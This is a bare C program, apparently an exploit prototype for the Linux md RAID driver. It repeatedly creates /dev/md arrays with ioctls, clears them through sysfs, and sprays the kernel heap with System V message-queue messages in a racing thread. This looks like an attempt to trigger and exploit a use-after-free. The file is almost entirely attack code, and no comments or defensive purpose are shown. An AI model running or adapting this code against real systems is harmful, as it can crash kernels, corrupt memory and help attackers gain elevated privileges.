#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/stat.h>
#include <sys/sysmacros.h>
#include <sched.h>

#define MD_MAJOR 9
#define SET_ARRAY_INFO 0xc04c0923
#define ADD_NEW_DISK 0xc0140921
#define RUN_ARRAY 0x926
#define STOP_ARRAY 0x8092

#define MD_DISK_ACTIVE 2
#define MD_DISK_SYNC 3

typedef struct {
    int minor;
    int major;
    int raid_disk;
    int number;
    int state;
} mdu_disk_info_t;

typedef struct {
    int major_version;
    int minor_version;
    int patch_version;
    unsigned long long ctime;
    int level;
    int size;
    int nr_disks;
    int raid_disks;
    int md_minor;
    int not_persistent;
    int utime;
    int state;
    int active_disks;
    int working_disks;
    int failed_disks;
    int spare_disks;
    int layout;
    int chunk_size;
} mdu_array_info_t;

static int wr(const char *p, const char *v, int *er)
{
    int fd = open(p, O_WRONLY);
    if (fd < 0) { if (er) *er = errno; return -1; }
    ssize_t n = write(fd, v, strlen(v));
    int e = errno;
    close(fd);
    if (er) *er = e;
    return n < 0 ? -1 : 0;
}

static void mkdev_md(int n)
{
    char p[64];
    snprintf(p, sizeof(p), "/dev/md%d", n);
    if (access(p, F_OK) == 0) return;
    mknod(p, S_IFBLK | 0600, makedev(MD_MAJOR, n));
}

struct spray_arg { int qid, count, size; volatile int *go, *done; };

static void *spray_thread(void *a)
{
    struct spray_arg *sa = (struct spray_arg *)a;
    int sz = sa->size;
    char *msg = malloc(sz + 64);
    if (!msg) return NULL;
    for (;;) {
        while (!*sa->go) {
            if (*sa->done) { free(msg); return NULL; }
            sched_yield();
        }
        for (int i = 0; i < sa->count; i++) {
            *(long *)msg = 0;
            memset(msg + 8, 0x41, sz);
            if (msgsnd(sa->qid, msg, sz, IPC_NOWAIT) < 0)
                break;
        }
        *sa->go = 0;
        *sa->done = 1;
    }
}

int main(int argc, char **argv)
{
    int rounds = argc > 1 ? atoi(argv[1]) : 40;
    int sz = argc > 2 ? atoi(argv[2]) : 960;

    printf("V9 uid=%d rounds=%d msgsz=%d\n", getuid(), rounds, sz);
    fflush(stdout);

    mkdev_md(0);
    mkdev_md(1);

    int qid = msgget(IPC_PRIVATE, 0600 | IPC_CREAT);
    if (qid < 0) { printf("msgget %d\n", errno); return 1; }
    volatile int go = 0, done = 0;
    struct spray_arg sa = { qid, 3000, sz, &go, &done };
    pthread_t th;
    pthread_create(&th, NULL, spray_thread, &sa);

    int ok_run = 0, ok_clr = 0;

    for (int i = 0; i < rounds; i++) {
        int n = i & 1;
        char dev[32], p[128];
        snprintf(dev, sizeof(dev), "/dev/md%d", n);

        int fd = open(dev, O_RDWR | O_EXCL);
        if (fd < 0) { printf("r=%d open e=%d\n", i, errno); continue; }

        mdu_array_info_t ai;
        memset(&ai, 0, sizeof(ai));
        ai.level = 1;
        ai.size = 2048;
        ai.nr_disks = 1;
        ai.raid_disks = 1;
        ai.md_minor = n;
        ai.not_persistent = 1;
        int r1 = ioctl(fd, SET_ARRAY_INFO, &ai);

        mdu_disk_info_t di;
        memset(&di, 0, sizeof(di));
        di.number = 0;
        di.major = 1;
        di.minor = 0;
        di.raid_disk = 0;
        di.state = (1 << MD_DISK_ACTIVE) | (1 << MD_DISK_SYNC);
        int r2 = ioctl(fd, ADD_NEW_DISK, &di);

        int r3 = ioctl(fd, RUN_ARRAY, 0);
        if (r3 == 0) ok_run++;
        else if (i < 2) printf("r=%d SETINFO=%d ADD=%d RUN=%d e=%d\n", i, r1, r2, r3, errno);

        done = 0;
        go = 1;

        snprintf(p, sizeof(p), "/sys/block/md%d/md/array_state", n);
        int e = 0;
        if (wr(p, "clear", &e) == 0) ok_clr++;

        for (int w = 0; w < 300 && !done; w++) usleep(500);
        go = 0;

        char tmp[8192];
        while (msgrcv(qid, tmp, sizeof(tmp), 0, IPC_NOWAIT | MSG_NOERROR) >= 0)
            ;

        close(fd);

        if ((i % 10) == 0) {
            printf("r=%d run=%d clr=%d\n", i, ok_run, ok_clr);
            fflush(stdout);
        }
        usleep(30000);
    }

    done = 1; go = 1;
    printf("V9FINAL run=%d clear=%d\n", ok_run, ok_clr);
    printf("V9 done\n");
    fflush(stdout);
    return 0;
}